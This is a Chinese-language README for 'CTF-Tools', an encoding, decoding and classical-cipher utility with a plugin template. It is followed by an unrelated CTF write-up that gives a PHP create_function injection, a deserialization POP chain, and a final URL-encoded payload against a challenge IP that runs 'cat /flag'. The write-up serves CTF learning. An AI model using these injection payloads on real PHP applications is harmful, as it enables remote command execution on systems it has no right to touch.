# CTF-Tools

![1](https://github.com/qianxiao996/CTF-Tools/blob/master/1.jpg)

一款CTF编码、解码、加密、解密工具。

##### 安装依赖：

- pip install base36
- pip install base58
- pip install base91
- py3base92-master\py3base92_setup>install.bat 到github上找到py3base92下载，执行install.bat
- pip install pybase62
- pip install PyQt5
- pip install pyperclip
- pip install wheel
- pip install F:\download\gmpy2-2.0.8-cp39-cp39-win_amd64.whl(我的python是3.9版本，所以下载的是cp39,https://www.lfd.uci.edu/~gohlke/pythonlibs/ 到这里搜索下载)


##### 支持的编码解码:

- [x] URL-UTF-8            
- [x] URL-GB2312
- [x] Unicode
- [x] Escape(%U)
- [x] HtmlEncode
- [x] ACSII
- [x] Base16
- [x] Base32
- [x] Base64
- [x] Str->Hex
- [x] Shellcode
- [x] qwerty(键盘密码)
- [x] 图片转base64
- [x] 图片转hex

##### 支持的加密解密:

- [x] Rot13
- [x] 凯撒密码
- [x] 栅栏密码
- [x] 栅栏密码(W型)
- [x] 培根密码
- [x] 摩斯密码
- [x] 移位密码
- [x] 云影密码
- [x] 当铺密码
- [x] 维尼吉亚密码
- [x] 埃特巴什码
- [x] base64转图片

##### 进制转换:

- [x] 2->8
- [x] 2->10
- [x] 2->16
- [x] 8->2
- [x] 8->10
- [x] 8->16
- [x] 10->2
- [x] 10->8
- [x] 10->16
- [x] 16->2
- [x] 16->8
- [x] 16->10
- [x] 任意进制转换

##### 在线编码网站:

- [x] Jsfuck
- [x] AAencode
- [x] XXencode
- [x] JJencode
- [x] UUencode
- [x] Brainfuck/Ook!
- [x] 敲击码
- [x] 猪圈密码
- [x] 综合网站
- [x] Rabbit

......

##### 插件功能:

须在Plugins目录下的Plugins.json写入插件名称和文件名。

插件模板

```
def run(source_text):
    #source_text 为前端输入的源文本字符串
    #插件测试模板，返回一个加密解密结果即可
    result='插件测试'
    return result
```



php的神奇函数
create_function；如下代码就能调用系统命令ls /

```php
<?php
echo 'Hello World!';
create_function('',";}system('ls /');//")
?>
```


```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$pwd=getcwd();
class func
{
        public $mod1="1";
        public $mod2="2";
         public $key="3";
        public function __destruct()
        {        
                unserialize($this->key)();
                $this->mod2 = "welcome ".$this->mod1;
                  
        } 
}

class GetFlag
{        public $code;
         public $action;
        public function get_flag(){
            $a=$this->action;
            $a('', $this->code);
        }
}


$str = 'O%3A4%3A%22func%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A121%3A%22a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22GetFlag%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A19%3A%22%3B%7Dsystem%28%27ls+%2F%27%29%3B%2F%2F%22%3Bs%3A6%3A%22action%22%3Bs%3A15%3A%22create_function%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7D%22%3B%7D';
echo urldecode($str);
unserialize(urldecode($str));

?> 

```





首先利用一个creat_function()函数去做这里，`$a('', $this->code);`

要执行到getflag的get_flag方法，就可以这样打pop链：

```php

<?php
class func
{
    public $key;
    public function __construct()
{
        $this->key = serialize([new GetFlag(), "get_flag"]);
    }
}


class GetFlag
{
    public $code;
    public $action;
    public function __construct()
{
        $this->code = ";}system('ls /');//";
        $this->action = "create_function";
    }
}
echo urlencode(serialize(new func()));  
O%3A4%3A%22func%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A121%3A%22a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22GetFlag%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A19%3A%22%3B%7Dsystem%28%27ls+%2F%27%29%3B%2F%2F%22%3Bs%3A6%3A%22action%22%3Bs%3A15%3A%22create_function%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7D%22%3B%7D

```

成功执行了命令，flag在根目录，cat /flag 就OK了：

最终payload：

http://111.74.9.109:10069/?0=O%3A4%3A%22func%22%3A3%3A%7Bs%3A4%3A%22mod1%22%3BN%3Bs%3A4%3A%22mod2%22%3BN%3Bs%3A3%3A%22key%22%3Bs%3A126%3A%22a%3A2%3A%7Bi%3A0%3BO%3A7%3A%22GetFlag%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A24%3A%22%3B%7Dsystem%28%27cat+%2Fflag%27%29%3B%2F%2F%22%3Bs%3A6%3A%22action%22%3Bs%3A15%3A%22create_function%22%3B%7Di%3A1%3Bs%3A8%3A%22get_flag%22%3B%7D%22%3B%7D

图片
